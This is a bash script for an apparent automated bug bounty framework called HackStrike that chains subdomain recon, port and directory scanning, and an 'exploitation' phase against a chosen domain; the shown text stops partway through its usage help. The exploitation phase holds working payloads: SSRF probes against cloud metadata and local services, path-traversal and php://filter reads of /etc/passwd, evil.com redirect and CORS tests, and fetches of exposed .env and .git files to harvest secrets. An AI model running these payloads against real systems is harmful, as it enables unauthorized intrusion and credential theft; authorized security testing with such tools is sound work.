#!/bin/bash

#====================================================================
#  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
#  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
#  ███████║███████║██║     █████╔╝ ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  
#  ██╔══██║██╔══██║██║     ██╔═██╗ ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
#  ██║  ██║██║  ██║╚██████╗██║  ██╗███████║   ██║   ██║  ██║██║██║  ██╗███████╗
#  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
#                                                                              
#  Advanced Automated Bug Bounty Framework v1.0
#  Author: HackTools Project
#  
#  DISCLAIMER: Use only on authorized targets. You are responsible
#  for your actions. Unauthorized access is illegal.
#====================================================================

set -o pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'

# Globals
VERSION="1.0"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
TARGET=""
OUTPUT_DIR=""
THREADS=50
RATE_LIMIT=150
TIMEOUT=10
SCAN_MODE="full"  # full, recon, scan, exploit, stealth
WORDLIST_DIR="/usr/share/seclists"
NUCLEI_TEMPLATES="$HOME/nuclei-templates"
AGGRESSIVE=false
DEEP_SCAN=false
WAF_BYPASS=false
NO_LIMIT=false

# Tool check arrays
REQUIRED_TOOLS=(subfinder amass httpx nuclei nmap ffuf)
OPTIONAL_TOOLS=(katana gau waybackurls dnsx naabu gobuster feroxbuster dalfox sqlmap arjun hakrawler gospider wpscan whatweb wafw00f nikto)

#====================================================================
# UTILITY FUNCTIONS
#====================================================================

banner() {
    clear
    echo -e "${RED}"
    cat << "EOF"
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
    ███████║███████║██║     █████╔╝ ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
    ██║  ██║██║  ██║╚██████╗██║  ██╗███████║   ██║   ██║  ██║██║██║  ██╗███████╗
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
EOF
    echo -e "${NC}"
    echo -e "${CYAN}    ═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}         Advanced Automated Bug Bounty Framework ${YELLOW}v${VERSION}${NC}"
    echo -e "${CYAN}    ═══════════════════════════════════════════════════════════════════${NC}"
    echo ""
}

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[-]${NC} $1"; }
info() { echo -e "${BLUE}[*]${NC} $1"; }
success() { echo -e "${GREEN}[✓]${NC} $1"; }
running() { echo -e "${PURPLE}[→]${NC} $1"; }

section() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC} ${WHITE}${BOLD}$1${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

subsection() {
    echo ""
    echo -e "${YELLOW}┌─────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│${NC} ${BOLD}$1${NC}"
    echo -e "${YELLOW}└─────────────────────────────────────────────────────────────────────┘${NC}"
}

progress() {
    local current=$1
    local total=$2
    local width=50
    local percent=$((current * 100 / total))
    local filled=$((width * current / total))
    local empty=$((width - filled))
    printf "\r${CYAN}[${NC}"
    printf "%${filled}s" '' | tr ' ' '█'
    printf "%${empty}s" '' | tr ' ' '░'
    printf "${CYAN}]${NC} ${percent}%% "
}

spinner() {
    local pid=$1
    local delay=0.1
    local spinstr='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    while ps -p $pid > /dev/null 2>&1; do
        for i in $(seq 0 9); do
            printf "\r${CYAN}[${spinstr:$i:1}]${NC} $2"
            sleep $delay
        done
    done
    printf "\r"
}

check_tools() {
    section "Checking Required Tools"
    
    local missing=()
    for tool in "${REQUIRED_TOOLS[@]}"; do
        if command -v "$tool" &> /dev/null; then
            echo -e "  ${GREEN}✓${NC} $tool"
        else
            echo -e "  ${RED}✗${NC} $tool ${RED}(REQUIRED)${NC}"
            missing+=("$tool")
        fi
    done
    
    echo ""
    info "Optional tools:"
    for tool in "${OPTIONAL_TOOLS[@]}"; do
        if command -v "$tool" &> /dev/null; then
            echo -e "  ${GREEN}✓${NC} $tool"
        else
            echo -e "  ${YELLOW}○${NC} $tool (optional)"
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo ""
        error "Missing required tools: ${missing[*]}"
        error "Run: ./install-tools.sh to install them"
        exit 1
    fi
    
    success "All required tools available!"
}

setup_output() {
    OUTPUT_DIR="$SCRIPT_DIR/results/${TARGET}_${TIMESTAMP}"
    mkdir -p "$OUTPUT_DIR"/{recon,subdomains,urls,ports,vulns,web,exploits,reports,screenshots,js,params,secrets}
    
    # Create summary file
    echo "# HackStrike Scan Report" > "$OUTPUT_DIR/reports/summary.md"
    echo "Target: $TARGET" >> "$OUTPUT_DIR/reports/summary.md"
    echo "Date: $(date)" >> "$OUTPUT_DIR/reports/summary.md"
    echo "Mode: $SCAN_MODE" >> "$OUTPUT_DIR/reports/summary.md"
    echo "---" >> "$OUTPUT_DIR/reports/summary.md"
    
    log "Output directory: $OUTPUT_DIR"
}

#====================================================================
# PHASE 1: RECONNAISSANCE
#====================================================================

phase_recon() {
    section "PHASE 1: RECONNAISSANCE"
    
    # 1.1 Subdomain Enumeration
    subsection "1.1 Subdomain Enumeration"
    
    running "Running Subfinder..."
    subfinder -d "$TARGET" -all -silent -t $THREADS -o "$OUTPUT_DIR/subdomains/subfinder.txt" 2>/dev/null &
    local pid1=$!
    
    running "Running Amass (passive)..."
    timeout 600 amass enum -passive -d "$TARGET" -o "$OUTPUT_DIR/subdomains/amass.txt" 2>/dev/null &
    local pid2=$!
    
    if command -v assetfinder &> /dev/null; then
        running "Running Assetfinder..."
        assetfinder --subs-only "$TARGET" > "$OUTPUT_DIR/subdomains/assetfinder.txt" 2>/dev/null &
        local pid3=$!
    fi
    
    if command -v findomain &> /dev/null; then
        running "Running Findomain..."
        findomain -t "$TARGET" -q > "$OUTPUT_DIR/subdomains/findomain.txt" 2>/dev/null &
        local pid4=$!
    fi
    
    # Wait for subdomain tools
    wait $pid1 2>/dev/null
    wait $pid2 2>/dev/null
    wait $pid3 2>/dev/null
    wait $pid4 2>/dev/null
    
    # Merge and dedupe subdomains
    cat "$OUTPUT_DIR/subdomains/"*.txt 2>/dev/null | sort -u > "$OUTPUT_DIR/subdomains/all_subdomains.txt"
    local subdomain_count=$(wc -l < "$OUTPUT_DIR/subdomains/all_subdomains.txt" 2>/dev/null || echo 0)
    success "Found $subdomain_count unique subdomains"
    
    # 1.2 DNS Resolution
    subsection "1.2 DNS Resolution & Live Host Detection"
    
    if command -v dnsx &> /dev/null; then
        running "Resolving DNS with DNSx..."
        dnsx -l "$OUTPUT_DIR/subdomains/all_subdomains.txt" -a -aaaa -cname -resp -silent -t $THREADS \
            -o "$OUTPUT_DIR/recon/dns_resolved.txt" 2>/dev/null
    fi
    
    # 1.3 HTTP Probing
    running "Probing for live HTTP(S) hosts..."
    httpx -l "$OUTPUT_DIR/subdomains/all_subdomains.txt" -silent -t $THREADS \
        -status-code -title -tech-detect -follow-redirects \
        -o "$OUTPUT_DIR/recon/live_hosts.txt" 2>/dev/null
    
    # Extract just URLs
    cat "$OUTPUT_DIR/recon/live_hosts.txt" 2>/dev/null | awk '{print $1}' > "$OUTPUT_DIR/recon/live_urls.txt"
    local live_count=$(wc -l < "$OUTPUT_DIR/recon/live_urls.txt" 2>/dev/null || echo 0)
    success "Found $live_count live hosts"
    
    # 1.4 Technology Detection
    subsection "1.3 Technology Detection"
    
    if command -v whatweb &> /dev/null; then
        running "Detecting technologies with WhatWeb..."
        whatweb -i "$OUTPUT_DIR/recon/live_urls.txt" --no-errors -q \
            > "$OUTPUT_DIR/recon/technologies.txt" 2>/dev/null
    fi
    
    # 1.5 WAF Detection
    if command -v wafw00f &> /dev/null; then
        running "Detecting WAF..."
        head -20 "$OUTPUT_DIR/recon/live_urls.txt" | while read url; do
            wafw00f "$url" -o "$OUTPUT_DIR/recon/waf_detection.txt" 2>/dev/null
        done
    fi
    
    # 1.6 URL Collection
    subsection "1.4 URL & Endpoint Collection"
    
    running "Collecting URLs from Wayback Machine..."
    if command -v waybackurls &> /dev/null; then
        echo "$TARGET" | waybackurls > "$OUTPUT_DIR/urls/wayback.txt" 2>/dev/null &
        local wpid=$!
    fi
    
    if command -v gau &> /dev/null; then
        running "Collecting URLs with GAU..."
        echo "$TARGET" | gau --threads $THREADS > "$OUTPUT_DIR/urls/gau.txt" 2>/dev/null &
        local gpid=$!
    fi
    
    wait $wpid 2>/dev/null
    wait $gpid 2>/dev/null
    
    # Crawl live hosts
    if command -v katana &> /dev/null; then
        running "Crawling with Katana..."
        katana -list "$OUTPUT_DIR/recon/live_urls.txt" -silent -d 3 -jc -t $THREADS \
            -o "$OUTPUT_DIR/urls/katana.txt" 2>/dev/null
    fi
    
    if command -v hakrawler &> /dev/null; then
        running "Crawling with Hakrawler..."
        cat "$OUTPUT_DIR/recon/live_urls.txt" | hakrawler -d 2 -t $THREADS \
            > "$OUTPUT_DIR/urls/hakrawler.txt" 2>/dev/null
    fi
    
    if command -v gospider &> /dev/null; then
        running "Crawling with GoSpider..."
        gospider -S "$OUTPUT_DIR/recon/live_urls.txt" -d 2 -t $THREADS --no-redirect \
            -o "$OUTPUT_DIR/urls/gospider/" 2>/dev/null
        cat "$OUTPUT_DIR/urls/gospider/"* 2>/dev/null | grep -oP 'https?://[^\s"]+' >> "$OUTPUT_DIR/urls/gospider.txt"
    fi
    
    # Merge all URLs
    cat "$OUTPUT_DIR/urls/"*.txt 2>/dev/null | sort -u > "$OUTPUT_DIR/urls/all_urls.txt"
    local url_count=$(wc -l < "$OUTPUT_DIR/urls/all_urls.txt" 2>/dev/null || echo 0)
    success "Collected $url_count unique URLs"
    
    # 1.7 Extract interesting patterns
    subsection "1.5 Pattern Extraction"
    
    running "Extracting JS files..."
    grep -iE '\.js(\?|$)' "$OUTPUT_DIR/urls/all_urls.txt" 2>/dev/null | sort -u > "$OUTPUT_DIR/js/js_files.txt"
    
    running "Extracting endpoints with parameters..."
    grep -E '\?' "$OUTPUT_DIR/urls/all_urls.txt" 2>/dev/null | sort -u > "$OUTPUT_DIR/params/urls_with_params.txt"
    
    running "Extracting potential API endpoints..."
    grep -iE '(api|v[0-9]|graphql|rest|json|xml)' "$OUTPUT_DIR/urls/all_urls.txt" 2>/dev/null \
        | sort -u > "$OUTPUT_DIR/urls/api_endpoints.txt"
    
    running "Extracting potential sensitive files..."
    grep -iE '\.(sql|bak|backup|old|conf|config|ini|log|txt|xml|json|yml|yaml|env|git|svn|db|sqlite)' \
        "$OUTPUT_DIR/urls/all_urls.txt" 2>/dev/null | sort -u > "$OUTPUT_DIR/urls/sensitive_files.txt"
    
    success "Reconnaissance phase complete!"
}

#====================================================================
# PHASE 2: SCANNING
#====================================================================

phase_scan() {
    section "PHASE 2: SCANNING"
    
    # 2.1 Port Scanning
    subsection "2.1 Port Scanning"
    
    if command -v naabu &> /dev/null; then
        running "Fast port scan with Naabu..."
        naabu -list "$OUTPUT_DIR/subdomains/all_subdomains.txt" -top-ports 1000 -silent -rate $RATE_LIMIT \
            -o "$OUTPUT_DIR/ports/naabu_ports.txt" 2>/dev/null
    fi
    
    # Deep port scan on main target
    if [[ "$DEEP_SCAN" == true ]]; then
        running "Deep Nmap scan on main target..."
        nmap -sV -sC -A -T4 --top-ports 10000 "$TARGET" \
            -oN "$OUTPUT_DIR/ports/nmap_detailed.txt" \
            -oX "$OUTPUT_DIR/ports/nmap_detailed.xml" 2>/dev/null
    else
        running "Quick Nmap scan..."
        nmap -sV -T4 --top-ports 1000 "$TARGET" \
            -oN "$OUTPUT_DIR/ports/nmap_quick.txt" 2>/dev/null
    fi
    
    # 2.2 Directory Fuzzing
    subsection "2.2 Directory & File Fuzzing"
    
    local wordlist="$WORDLIST_DIR/Discovery/Web-Content/raft-medium-directories.txt"
    [[ ! -f "$wordlist" ]] && wordlist="/usr/share/wordlists/dirb/common.txt"
    
    if [[ -f "$wordlist" ]]; then
        # Fuzz top 10 live hosts
        head -10 "$OUTPUT_DIR/recon/live_urls.txt" 2>/dev/null | while read url; do
            local domain=$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1)
            running "Fuzzing: $url"
            
            if command -v feroxbuster &> /dev/null; then
                feroxbuster -u "$url" -w "$wordlist" -t $THREADS -k -q --no-state \
                    -o "$OUTPUT_DIR/web/fuzz_${domain}.txt" 2>/dev/null
            elif command -v ffuf &> /dev/null; then
                ffuf -u "${url}/FUZZ" -w "$wordlist" -t $THREADS -mc all -fc 404 \
                    -o "$OUTPUT_DIR/web/fuzz_${domain}.json" -of json 2>/dev/null
            fi
        done
    fi
    
    # 2.3 Parameter Discovery
    subsection "2.3 Parameter Discovery"
    
    if command -v arjun &> /dev/null; then
        running "Discovering hidden parameters with Arjun..."
        head -5 "$OUTPUT_DIR/recon/live_urls.txt" 2>/dev/null | while read url; do
            arjun -u "$url" -t $THREADS -o "$OUTPUT_DIR/params/arjun_$(echo $url | md5sum | cut -c1-8).json" 2>/dev/null
        done
    fi
    
    # 2.4 Vulnerability Scanning with Nuclei
    subsection "2.4 Vulnerability Scanning"
    
    running "Running Nuclei vulnerability scanner..."
    
    # Update templates if needed
    nuclei -ut 2>/dev/null
    
    # Run nuclei with all severity levels
    if [[ "$AGGRESSIVE" == true ]]; then
        nuclei -l "$OUTPUT_DIR/recon/live_urls.txt" -t "$NUCLEI_TEMPLATES" \
            -severity critical,high,medium,low,info \
            -c $THREADS -rl $RATE_LIMIT \
            -o "$OUTPUT_DIR/vulns/nuclei_all.txt" \
            -je "$OUTPUT_DIR/vulns/nuclei_all.json" 2>/dev/null
    else
        nuclei -l "$OUTPUT_DIR/recon/live_urls.txt" \
            -severity critical,high,medium \
            -c $THREADS -rl $RATE_LIMIT \
            -o "$OUTPUT_DIR/vulns/nuclei_findings.txt" \
            -je "$OUTPUT_DIR/vulns/nuclei_findings.json" 2>/dev/null
    fi
    
    # Also scan URLs with parameters
    if [[ -s "$OUTPUT_DIR/params/urls_with_params.txt" ]]; then
        running "Scanning parameterized URLs..."
        nuclei -l "$OUTPUT_DIR/params/urls_with_params.txt" \
            -t "$NUCLEI_TEMPLATES/fuzzing/" \
            -t "$NUCLEI_TEMPLATES/vulnerabilities/" \
            -severity critical,high,medium \
            -c $THREADS -rl $RATE_LIMIT \
            -o "$OUTPUT_DIR/vulns/nuclei_params.txt" 2>/dev/null
    fi
    
    # 2.5 CMS Specific Scanning
    subsection "2.5 CMS Detection & Scanning"
    
    # WordPress detection and scanning
    if command -v wpscan &> /dev/null; then
        grep -i 'wordpress' "$OUTPUT_DIR/recon/technologies.txt" 2>/dev/null | while read line; do
            local url=$(echo "$line" | grep -oP 'https?://[^\s]+' | head -1)
            if [[ -n "$url" ]]; then
                running "WordPress scan: $url"
                wpscan --url "$url" --enumerate vp,vt,u --no-banner \
                    -o "$OUTPUT_DIR/web/wpscan_$(echo $url | md5sum | cut -c1-8).txt" 2>/dev/null
            fi
        done
    fi
    
    # 2.6 Nikto scan
    if command -v nikto &> /dev/null && [[ "$DEEP_SCAN" == true ]]; then
        subsection "2.6 Nikto Web Scanner"
        running "Running Nikto (this takes time)..."
        head -3 "$OUTPUT_DIR/recon/live_urls.txt" 2>/dev/null | while read url; do
            nikto -h "$url" -output "$OUTPUT_DIR/web/nikto_$(echo $url | md5sum | cut -c1-8).txt" 2>/dev/null
        done
    fi
    
    success "Scanning phase complete!"
}

#====================================================================
# PHASE 3: EXPLOITATION
#====================================================================

phase_exploit() {
    section "PHASE 3: EXPLOITATION TESTING"
    
    # 3.1 XSS Testing
    subsection "3.1 XSS Vulnerability Testing"
    
    if command -v dalfox &> /dev/null; then
        running "Testing XSS with Dalfox..."
        
        if [[ -s "$OUTPUT_DIR/params/urls_with_params.txt" ]]; then
            dalfox file "$OUTPUT_DIR/params/urls_with_params.txt" \
                --silence --no-color --no-spinner \
                -w $THREADS \
                -o "$OUTPUT_DIR/exploits/xss_dalfox.txt" 2>/dev/null
        fi
        
        # Test from GAU URLs
        if [[ -s "$OUTPUT_DIR/urls/gau.txt" ]]; then
            grep '=' "$OUTPUT_DIR/urls/gau.txt" 2>/dev/null | head -500 | \
            dalfox pipe --silence --no-color --no-spinner \
                -w $THREADS \
                -o "$OUTPUT_DIR/exploits/xss_gau.txt" 2>/dev/null
        fi
    fi
    
    # 3.2 SQL Injection Testing
    subsection "3.2 SQL Injection Testing"
    
    if command -v sqlmap &> /dev/null; then
        running "Testing SQLi with SQLMap..."
        
        # Test URLs with parameters
        if [[ -s "$OUTPUT_DIR/params/urls_with_params.txt" ]]; then
            head -20 "$OUTPUT_DIR/params/urls_with_params.txt" | while read url; do
                sqlmap -u "$url" --batch --random-agent --level=1 --risk=1 \
                    --output-dir="$OUTPUT_DIR/exploits/sqlmap/" \
                    --answers="follow=Y" 2>/dev/null | \
                    grep -E '(is vulnerable|Parameter|injectable)' >> "$OUTPUT_DIR/exploits/sqli_findings.txt"
            done
        fi
    fi
    
    # 3.3 SSRF Testing
    subsection "3.3 SSRF Testing"
    
    running "Testing for SSRF..."
    if [[ -s "$OUTPUT_DIR/params/urls_with_params.txt" ]]; then
        # Basic SSRF payloads
        local ssrf_payloads=(
            "http://169.254.169.254/latest/meta-data/"
            "http://127.0.0.1:22"
            "http://localhost:6379"
            "http://[::1]/"
            "file:///etc/passwd"
        )
        
        grep -iE '(url=|link=|redirect=|dest=|uri=|path=|site=|page=|file=|load=|fetch=)' \
            "$OUTPUT_DIR/params/urls_with_params.txt" 2>/dev/null | head -20 | while read url; do
            for payload in "${ssrf_payloads[@]}"; do
                local test_url=$(echo "$url" | sed "s|=.*|=$payload|")
                local response=$(curl -sk --max-time 5 "$test_url" 2>/dev/null)
                if echo "$response" | grep -qiE '(root:|ami-|instance-id|redis_version)'; then
                    echo "[SSRF] $test_url" >> "$OUTPUT_DIR/exploits/ssrf_findings.txt"
                fi
            done
        done
    fi
    
    # 3.4 Open Redirect Testing
    subsection "3.4 Open Redirect Testing"
    
    running "Testing for Open Redirects..."
    grep -iE '(redirect|return|next|url|dest|redir|destination|go|target|link|view)=' \
        "$OUTPUT_DIR/params/urls_with_params.txt" 2>/dev/null | head -30 | while read url; do
        local test_url=$(echo "$url" | sed 's|=.*|=https://evil.com|')
        local location=$(curl -skI --max-time 5 "$test_url" 2>/dev/null | grep -i 'location:' | head -1)
        if echo "$location" | grep -qi 'evil.com'; then
            echo "[OPEN REDIRECT] $url" >> "$OUTPUT_DIR/exploits/redirect_findings.txt"
        fi
    done
    
    # 3.5 LFI/RFI Testing
    subsection "3.5 LFI/RFI Testing"
    
    running "Testing for LFI/RFI..."
    local lfi_payloads=(
        "../../../../etc/passwd"
        "....//....//....//etc/passwd"
        "/etc/passwd%00"
        "php://filter/convert.base64-encode/resource=/etc/passwd"
        "php://input"
    )
    
    grep -iE '(file=|page=|include=|path=|doc=|document=|folder=|root=|pg=|style=|template=|php_path=|lang=)' \
        "$OUTPUT_DIR/params/urls_with_params.txt" 2>/dev/null | head -20 | while read url; do
        for payload in "${lfi_payloads[@]}"; do
            local test_url=$(echo "$url" | sed "s|=.*|=$payload|")
            local response=$(curl -sk --max-time 5 "$test_url" 2>/dev/null)
            if echo "$response" | grep -qE '(root:|daemon:|bin:)'; then
                echo "[LFI] $test_url" >> "$OUTPUT_DIR/exploits/lfi_findings.txt"
            fi
        done
    done
    
    # 3.6 CORS Misconfiguration
    subsection "3.6 CORS Misconfiguration Testing"
    
    running "Testing CORS configurations..."
    head -30 "$OUTPUT_DIR/recon/live_urls.txt" 2>/dev/null | while read url; do
        local cors_header=$(curl -skI -H "Origin: https://evil.com" "$url" 2>/dev/null | grep -i 'access-control-allow-origin')
        if echo "$cors_header" | grep -qi 'evil.com\|null\|\*'; then
            echo "[CORS] $url - $cors_header" >> "$OUTPUT_DIR/exploits/cors_findings.txt"
        fi
    done
    
    # 3.7 Subdomain Takeover
    subsection "3.7 Subdomain Takeover Check"
    
    running "Checking for subdomain takeover..."
    if command -v nuclei &> /dev/null; then
        nuclei -l "$OUTPUT_DIR/subdomains/all_subdomains.txt" \
            -t "$NUCLEI_TEMPLATES/takeovers/" \
            -c $THREADS \
            -o "$OUTPUT_DIR/exploits/takeover_findings.txt" 2>/dev/null
    fi
    
    # 3.8 Secrets & Sensitive Data
    subsection "3.8 Secrets & Sensitive Data Discovery"
    
    running "Scanning for exposed secrets..."
    
    # Scan JS files for secrets
    if [[ -s "$OUTPUT_DIR/js/js_files.txt" ]]; then
        head -100 "$OUTPUT_DIR/js/js_files.txt" | while read js_url; do
            local content=$(curl -sk --max-time 10 "$js_url" 2>/dev/null)
            
            # Check for API keys, tokens, secrets
            if echo "$content" | grep -qiE '(api[_-]?key|apikey|api[_-]?secret|aws[_-]?access|aws[_-]?secret|firebase|google[_-]?api|stripe[_-]?key|private[_-]?key|client[_-]?secret|access[_-]?token|auth[_-]?token|jwt|bearer)'; then
                echo "[SECRET] $js_url" >> "$OUTPUT_DIR/secrets/js_secrets.txt"
                echo "$content" | grep -oiE '.{0,50}(api[_-]?key|apikey|api[_-]?secret|aws[_-]?access|aws[_-]?secret|firebase|google[_-]?api|stripe[_-]?key|private[_-]?key|client[_-]?secret|access[_-]?token|auth[_-]?token).{0,50}' >> "$OUTPUT_DIR/secrets/js_secrets_detail.txt"
            fi
        done
    fi
    
    # Check for exposed .git
    running "Checking for exposed .git directories..."
    head -50 "$OUTPUT_DIR/recon/live_urls.txt" 2>/dev/null | while read url; do
        local git_check=$(curl -sk --max-time 5 "${url}/.git/HEAD" 2>/dev/null)
        if echo "$git_check" | grep -q 'ref:'; then
            echo "[GIT EXPOSED] $url/.git/" >> "$OUTPUT_DIR/secrets/exposed_git.txt"
        fi
    done
    
    # Check for exposed .env
    running "Checking for exposed .env files..."
    head -50 "$OUTPUT_DIR/recon/live_urls.txt" 2>/dev/null | while read url; do
        local env_check=$(curl -sk --max-time 5 "${url}/.env" 2>/dev/null)
        if echo "$env_check" | grep -qiE '(DB_|APP_|API_|SECRET|PASSWORD|KEY=)'; then
            echo "[ENV EXPOSED] $url/.env" >> "$OUTPUT_DIR/secrets/exposed_env.txt"
        fi
    done
    
    success "Exploitation testing phase complete!"
}

#====================================================================
# PHASE 4: REPORTING
#====================================================================

phase_report() {
    section "PHASE 4: GENERATING REPORT"
    
    local report="$OUTPUT_DIR/reports/full_report.md"
    
    cat << EOF > "$report"
# HackStrike Automated Scan Report

## Target Information
- **Target:** $TARGET
- **Scan Date:** $(date)
- **Scan Mode:** $SCAN_MODE
- **Output Directory:** $OUTPUT_DIR

---

## Executive Summary

### Statistics
EOF

    # Add statistics
    echo "| Category | Count |" >> "$report"
    echo "|----------|-------|" >> "$report"
    echo "| Subdomains | $(wc -l < "$OUTPUT_DIR/subdomains/all_subdomains.txt" 2>/dev/null || echo 0) |" >> "$report"
    echo "| Live Hosts | $(wc -l < "$OUTPUT_DIR/recon/live_urls.txt" 2>/dev/null || echo 0) |" >> "$report"
    echo "| URLs Collected | $(wc -l < "$OUTPUT_DIR/urls/all_urls.txt" 2>/dev/null || echo 0) |" >> "$report"
    echo "| JS Files | $(wc -l < "$OUTPUT_DIR/js/js_files.txt" 2>/dev/null || echo 0) |" >> "$report"
    echo "| Parameterized URLs | $(wc -l < "$OUTPUT_DIR/params/urls_with_params.txt" 2>/dev/null || echo 0) |" >> "$report"
    
    # Vulnerability summary
    cat << EOF >> "$report"

---

## Vulnerability Findings

### Critical/High Severity
EOF
    
    if [[ -f "$OUTPUT_DIR/vulns/nuclei_findings.txt" ]]; then
        grep -iE '\[critical\]|\[high\]' "$OUTPUT_DIR/vulns/nuclei_findings.txt" 2>/dev/null >> "$report" || echo "None found" >> "$report"
    else
        echo "No scan results available" >> "$report"
    fi
    
    cat << EOF >> "$report"

### Medium Severity
EOF
    
    if [[ -f "$OUTPUT_DIR/vulns/nuclei_findings.txt" ]]; then
        grep -i '\[medium\]' "$OUTPUT_DIR/vulns/nuclei_findings.txt" 2>/dev/null >> "$report" || echo "None found" >> "$report"
    fi
    
    cat << EOF >> "$report"

---

## Exploitation Findings

### XSS Vulnerabilities
EOF
    
    cat "$OUTPUT_DIR/exploits/xss_"*.txt 2>/dev/null >> "$report" || echo "None confirmed" >> "$report"
    
    cat << EOF >> "$report"

### SQL Injection
EOF
    
    cat "$OUTPUT_DIR/exploits/sqli_findings.txt" 2>/dev/null >> "$report" || echo "None confirmed" >> "$report"
    
    cat << EOF >> "$report"

### SSRF
EOF
    
    cat "$OUTPUT_DIR/exploits/ssrf_findings.txt" 2>/dev/null >> "$report" || echo "None confirmed" >> "$report"
    
    cat << EOF >> "$report"

### Open Redirects
EOF
    
    cat "$OUTPUT_DIR/exploits/redirect_findings.txt" 2>/dev/null >> "$report" || echo "None confirmed" >> "$report"
    
    cat << EOF >> "$report"

### LFI/RFI
EOF
    
    cat "$OUTPUT_DIR/exploits/lfi_findings.txt" 2>/dev/null >> "$report" || echo "None confirmed" >> "$report"
    
    cat << EOF >> "$report"

### CORS Misconfigurations
EOF
    
    cat "$OUTPUT_DIR/exploits/cors_findings.txt" 2>/dev/null >> "$report" || echo "None found" >> "$report"
    
    cat << EOF >> "$report"

### Subdomain Takeover
EOF
    
    cat "$OUTPUT_DIR/exploits/takeover_findings.txt" 2>/dev/null >> "$report" || echo "None found" >> "$report"
    
    cat << EOF >> "$report"

---

## Exposed Secrets

### Git Repositories
EOF
    
    cat "$OUTPUT_DIR/secrets/exposed_git.txt" 2>/dev/null >> "$report" || echo "None found" >> "$report"
    
    cat << EOF >> "$report"

### Environment Files
EOF
    
    cat "$OUTPUT_DIR/secrets/exposed_env.txt" 2>/dev/null >> "$report" || echo "None found" >> "$report"
    
    cat << EOF >> "$report"

### JS Secrets
EOF
    
    cat "$OUTPUT_DIR/secrets/js_secrets.txt" 2>/dev/null >> "$report" || echo "None found" >> "$report"
    
    cat << EOF >> "$report"

---

## Recommendations

1. Review all critical and high severity findings immediately
2. Implement proper input validation and output encoding
3. Configure CORS policies correctly
4. Remove exposed sensitive files (.git, .env, backups)
5. Implement rate limiting and WAF rules
6. Regular security assessments recommended

---

*Report generated by HackStrike v${VERSION}*
EOF

    success "Report generated: $report"
    
    # Quick summary on screen
    echo ""
    section "SCAN COMPLETE - QUICK SUMMARY"
    
    echo -e "${CYAN}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC}  ${WHITE}Target:${NC} $TARGET"
    echo -e "${CYAN}║${NC}  ${WHITE}Results:${NC} $OUTPUT_DIR"
    echo -e "${CYAN}╠════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}Subdomains:${NC}     $(wc -l < "$OUTPUT_DIR/subdomains/all_subdomains.txt" 2>/dev/null || echo 0)"
    echo -e "${CYAN}║${NC}  ${GREEN}Live Hosts:${NC}     $(wc -l < "$OUTPUT_DIR/recon/live_urls.txt" 2>/dev/null || echo 0)"
    echo -e "${CYAN}║${NC}  ${GREEN}URLs Found:${NC}     $(wc -l < "$OUTPUT_DIR/urls/all_urls.txt" 2>/dev/null || echo 0)"
    echo -e "${CYAN}╠════════════════════════════════════════════════════════╣${NC}"
    
    local vuln_count=$(wc -l < "$OUTPUT_DIR/vulns/nuclei_findings.txt" 2>/dev/null || echo 0)
    local xss_count=$(wc -l < "$OUTPUT_DIR/exploits/xss_dalfox.txt" 2>/dev/null || echo 0)
    local sqli_count=$(wc -l < "$OUTPUT_DIR/exploits/sqli_findings.txt" 2>/dev/null || echo 0)
    
    echo -e "${CYAN}║${NC}  ${RED}Vulnerabilities:${NC} $vuln_count"
    echo -e "${CYAN}║${NC}  ${RED}XSS Found:${NC}       $xss_count"
    echo -e "${CYAN}║${NC}  ${RED}SQLi Found:${NC}      $sqli_count"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    log "Full report: $report"
    log "View results: ls -la $OUTPUT_DIR/"
}

#====================================================================
# MAIN EXECUTION
#====================================================================

usage() {
    echo "Usage: $0 [OPTIONS] <target>"
    echo ""
    echo "Options:"
    echo "  -h, --help          Show this help message"
    echo "  -m, --mode MODE     Scan mode: full, recon, scan, exploit (default: full)"
    echo "  -t, --threads NUM   Number of threads (default: 50)"
    echo "  -r, --rate NUM      Rate limit per second (default: 150)"
    echo "  -o, --output DIR    Custom output directory"
    echo "  -a, --aggressive    Aggressive mode (more tests, louder)"
    echo "  -d, --deep          Deep scan mode (slower, more thorough)"
    echo "  -w, --waf-bypass    Enable WAF bypass techniques"
